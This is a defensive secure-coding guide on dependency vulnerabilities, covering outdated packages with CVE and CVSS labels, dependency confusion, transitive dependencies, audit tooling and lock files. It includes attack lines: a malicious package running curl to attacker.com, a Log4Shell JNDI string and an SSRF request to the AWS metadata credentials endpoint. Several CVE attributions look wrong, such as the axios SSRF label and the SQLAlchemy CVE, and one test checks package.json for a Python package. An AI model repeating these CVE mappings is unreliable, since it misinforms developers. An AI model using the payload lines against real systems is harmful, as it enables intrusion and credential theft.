# Dependency Vulnerability Examples

Real-world supply chain and dependency security vulnerabilities with CVE exploitation details, CVSS scoring, and complete remediation using Grey Haven stack (bun, FastAPI, PostgreSQL).

## Overview

**OWASP Category**: A06:2021 - Vulnerable and Outdated Components
**CVSS Range**: 4.0 - 10.0 (Varies by CVE)
**Impact**: Remote code execution, data exfiltration, denial of service, supply chain compromise

## Vulnerability Pattern 1: Known CVE in Dependencies

### Vulnerable Code (Outdated Packages)

```json
// package.json - VULNERABLE
{
  "dependencies": {
    "axios": "0.21.1",           // ❌ CVE-2021-3749 (SSRF, CVSS 7.5)
    "lodash": "4.17.19",         // ❌ CVE-2020-28500 (Prototype Pollution, CVSS 5.3)
    "express": "4.17.0",         // ❌ CVE-2022-24999 (Path Traversal, CVSS 7.5)
    "jsonwebtoken": "8.5.0",     // ❌ CVE-2022-23529 (Algorithm Confusion, CVSS 7.6)
    "node-fetch": "2.6.6",       // ❌ CVE-2022-0235 (SSRF, CVSS 6.1)
    "@tanstack/react-query": "4.0.0"  // ✅ No known CVEs
  }
}
```

```python
# requirements.txt - VULNERABLE
Flask==1.1.1              # ❌ CVE-2023-30861 (Session Cookie Leak, CVSS 7.5)
requests==2.25.0          # ❌ CVE-2023-32681 (Header Injection, CVSS 6.1)
Pillow==8.3.2             # ❌ CVE-2022-22817 (Buffer Overflow, CVSS 9.8)
cryptography==36.0.0      # ❌ CVE-2023-23931 (NULL Pointer, CVSS 7.5)
sqlalchemy==1.4.0         # ❌ CVE-2024-5629 (SQL Injection, CVSS 8.1)
```

### Exploitation: CVE-2021-3749 (axios SSRF)

```javascript
// Attacker-controlled URL
const maliciousUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';

// Vulnerable axios version allows SSRF
axios.get(userInput)  // userInput = maliciousUrl
  .then(res => {
    // Attacker retrieves AWS credentials from metadata service
    console.log(res.data);  // AWS IAM credentials leaked
  });
```

**Impact**:
- **AWS Credential Theft**: Complete cloud infrastructure compromise
- **Internal Network Access**: Bypass firewalls via SSRF
- **Estimated Damage**: $100K+ (unauthorized AWS usage + data breach)

### Secure Implementation

```json
// package.json - SECURE
{
  "dependencies": {
    "axios": "^1.6.0",           // ✅ Latest, no known CVEs
    "lodash": "^4.17.21",        // ✅ Patched
    "express": "^4.18.2",        // ✅ Latest
    "jsonwebtoken": "^9.0.2",    // ✅ Patched
    "node-fetch": "^3.3.0",      // ✅ Latest
    "@tanstack/react-query": "^5.17.0"
  },
  "engines": {
    "bun": ">=1.0.0",            // ✅ Specify minimum versions
    "node": ">=20.0.0"
  }
}
```

```python
# requirements.txt - SECURE (pinned to secure versions)
Flask==3.0.0              # ✅ Latest stable
requests==2.31.0          # ✅ Patched
Pillow==10.1.0            # ✅ Latest
cryptography==41.0.7      # ✅ Patched
sqlalchemy==2.0.23        # ✅ Latest

# pyproject.toml - MODERN APPROACH
[project]
dependencies = [
    "fastapi>=0.109.0",   # ✅ Minimum version constraint
    "pydantic>=2.5.0",
    "sqlmodel>=0.0.14"
]
```

## Vulnerability Pattern 2: Dependency Confusion Attack

### Vulnerable Scenario

```json
// package.json - VULNERABLE
{
  "dependencies": {
    "@greyhaven/utils": "1.0.0"  // Private package
  }
}

// ❌ No registry specified in .npmrc
// ❌ Public npm registry checked first
// Attacker publishes malicious @greyhaven/utils to public npm
```

**Exploitation**:
```bash
# Attacker creates malicious package
npm init -y
echo "console.log('MALICIOUS CODE'); require('child_process').exec('curl attacker.com/pwned')" > index.js
npm publish @greyhaven/utils  # To public npm

# Victim runs
bun install
# Downloads attacker's package instead of private package
# Executes malicious code during postinstall
```

**Impact**: Supply chain compromise, credential theft, backdoor installation

### Secure Implementation

```toml
# .npmrc - SECURE
@greyhaven:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=${NPM_TOKEN}

# Only use private registry for @greyhaven scope
# Prevent dependency confusion
```

```bash
# Or use bun with explicit registry
bun add @greyhaven/utils --registry https://npm.pkg.github.com
```

## Vulnerability Pattern 3: Transitive Dependencies

### Vulnerable Example

```json
// package.json - Appears safe
{
  "dependencies": {
    "safe-package": "1.0.0"
  }
}

// But safe-package depends on vulnerable package
// node_modules/safe-package/package.json
{
  "dependencies": {
    "vulnerable-lib": "0.9.0"  // ❌ CVE-2023-12345
  }
}
```

**Detection**:
```bash
# Scan all dependencies (including transitive)
bun audit

# Output:
# ❌ Critical: vulnerable-lib@0.9.0
# ❌ Severity: Critical (CVSS 9.8)
# ❌ Path: safe-package > vulnerable-lib
```

**Remediation**:
```json
// package.json - Force safe version
{
  "dependencies": {
    "safe-package": "1.0.0"
  },
  "overrides": {
    "vulnerable-lib": "^1.2.0"  // ✅ Force patched version
  }
}
```

## Automated Security Scanning

### bun audit (JavaScript/TypeScript)

```bash
# Scan for vulnerabilities
bun audit

# Output example:
# ┌──────────────────────────────────────────────────────────┐
# │                                                          │
# │   High  Prototype Pollution in lodash                   │
# │                                                          │
# │   Package       lodash                                   │
# │   Severity      High (7.4)                              │
# │   Vulnerable    <4.17.21                                │
# │   Patched       >=4.17.21                               │
# │   More info     https://github.com/advisories/...       │
# └──────────────────────────────────────────────────────────┘

# Fix automatically
bun update --latest

# Or fix specific package
bun update lodash@latest
```

### pip-audit (Python)

```bash
# Install pip-audit
pip install pip-audit

# Scan requirements.txt
pip-audit

# Output example:
# Found 3 vulnerabilities in 2 packages
# Name         Version  ID              Fix Versions
# ------------ -------- --------------- -------------
# Flask        1.1.1    CVE-2023-30861  2.2.5,2.3.2
# cryptography 36.0.0   CVE-2023-23931  39.0.1
# Pillow       8.3.2    CVE-2022-22817  9.0.0

# Fix by updating requirements.txt
pip install --upgrade Flask cryptography Pillow
pip freeze > requirements.txt
```

### Snyk (Comprehensive)

```bash
# Install Snyk
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
snyk test

# Monitor continuously
snyk monitor

# Fix automatically
snyk fix

# Output:
# ✗ High severity vulnerability found in axios
#   Path: axios@0.21.1
#   CVE: CVE-2021-3749
#   Fix: Upgrade to axios@1.6.0
```

## Lock File Security

### Secure Lock Files

```json
// bun.lockb - Binary lock file (bun)
// ✅ Integrity hashes for all packages
// ✅ Prevents tampering
// ✅ Commit to git

// package-lock.json - npm/bun compatible
{
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="
    }
  }
}
```

**Best Practices**:
```bash
# Always commit lock files
git add bun.lockb package-lock.json
git commit -m "Update dependencies with lock file"

# Verify lock file integrity
bun install --frozen-lockfile  # CI/CD

# If lock file tampered, installation fails
# ERROR: Integrity check failed for lodash@4.17.21
```

## Prevention Checklist

- [ ] **Run bun audit** weekly
- [ ] **Update dependencies** monthly
- [ ] **Pin exact versions** in production
- [ ] **Use lock files** (bun.lockb, requirements.txt)
- [ ] **Scan transitive dependencies**
- [ ] **Configure private registry** (.npmrc)
- [ ] **Enable Dependabot** (GitHub)
- [ ] **Use Snyk monitoring**
- [ ] **Review dependency licenses**
- [ ] **Minimize dependencies**

## Automated Dependency Updates

### GitHub Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Renovate Bot (Alternative)

```json
// renovate.json
{
  "extends": ["config:base"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch", "pin", "digest"],
      "automerge": true
    },
    {
      "matchDepTypes": ["devDependencies"],
      "automerge": true
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"]
  }
}
```

## Testing for Dependency Vulnerabilities

```typescript
// tests/security/dependencies.test.ts
import { describe, it, expect } from 'vitest';
import { execSync } from 'child_process';

describe('Dependency Security', () => {
  it('has no high or critical vulnerabilities', () => {
    const auditOutput = execSync('bun audit --json', { encoding: 'utf-8' });
    const audit = JSON.parse(auditOutput);

    const critical = audit.vulnerabilities.filter(v => v.severity === 'critical');
    const high = audit.vulnerabilities.filter(v => v.severity === 'high');

    expect(critical.length).toBe(0);
    expect(high.length).toBe(0);
  });

  it('has lock file committed', () => {
    const lockFileExists = execSync('git ls-files bun.lockb', { encoding: 'utf-8' });
    expect(lockFileExists.trim()).toBe('bun.lockb');
  });

  it('uses latest major versions', () => {
    const packageJson = require('../../package.json');

    // Check critical packages
    expect(packageJson.dependencies['@tanstack/react-query']).toMatch(/^\^5/);
    expect(packageJson.dependencies['react']).toMatch(/^\^19/);
    expect(packageJson.dependencies['fastapi']).toMatch(/^\^0.109/);
  });
});
```

## Real-World Impact

**Case Study: Log4Shell (CVE-2021-44228, CVSS 10.0)**
- **Vulnerability**: RCE in log4j 2.0 - 2.14.1
- **Attack**: `${jndi:ldap://attacker.com/exploit}` in log message
- **Impact**: 93% of cloud environments vulnerable, $10B+ global damage
- **Prevention**: Immediate update to log4j 2.17.0+, dependency scanning

**Case Study: 2024 xz-utils Backdoor**
- **Vulnerability**: Supply chain attack in xz-utils 5.6.0/5.6.1
- **Attack**: Malicious code in build process
- **Impact**: SSH authentication bypass on Linux servers
- **Prevention**: Pin dependencies, review changelogs, audit transitive deps

## CVSS Scoring Examples

| CVE | Package | CVSS | Impact |
|-----|---------|------|--------|
| **CVE-2021-44228** | log4j | 10.0 | Remote Code Execution |
| **CVE-2021-3749** | axios | 7.5 | Server-Side Request Forgery |
| **CVE-2022-23529** | jsonwebtoken | 7.6 | Algorithm Confusion |
| **CVE-2020-28500** | lodash | 5.3 | Prototype Pollution |
| **CVE-2023-30861** | Flask | 7.5 | Session Cookie Leak |

## Summary

| Attack Vector | Risk | Detection | Prevention |
|---------------|------|-----------|------------|
| **Known CVEs** | Critical | bun audit | Update dependencies |
| **Dependency Confusion** | High | Private registry | .npmrc config |
| **Transitive Dependencies** | Medium | Snyk/Dependabot | Lock files |
| **Supply Chain Attacks** | Critical | Code review | Pin versions |

**Key Takeaway**: Run `bun audit` and `pip-audit` weekly, enable Dependabot for automated updates, use lock files, and minimize dependencies to reduce attack surface.

---

**Previous**: [Secrets Exposure](secrets-exposure.md) | **Index**: [Examples Index](INDEX.md)
